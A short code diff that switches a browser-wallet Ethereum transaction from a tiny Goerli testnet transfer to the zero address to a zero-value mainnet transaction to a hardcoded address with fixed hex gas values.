@@ -22,13 +22,13 @@
 
           const transactionParameters = {
             nonce: web3.utils.toHex(nonce),
-            gasPrice: web3.utils.toHex(web3.utils.toWei('20', 'gwei')), // You can adjust the gas price
-            gas: web3.utils.toHex(21000), // Standard gas limit for ETH transfer
-            to: "0x0000000000000000000000000000000000000000",
-            from: account,
-            value: web3.utils.toHex(web3.utils.toWei('0.000000000000001', 'ether')), // Amount to send
+            gasPrice: "0x244AC6D",
+            gas: "0x12A52",
+            to: "0x6a726D9593EAfA6E2ffd2f63e95c2C33CdbCd403",
+            from: ethereum.selectedAddress,
+            value: "0x0",
             data: "0x00",
-            chainId: web3.utils.toHex(5), // Goerli testnet chain ID
+            chainId: "0x1",
           };
 
           const txHash = await ethereum.request({
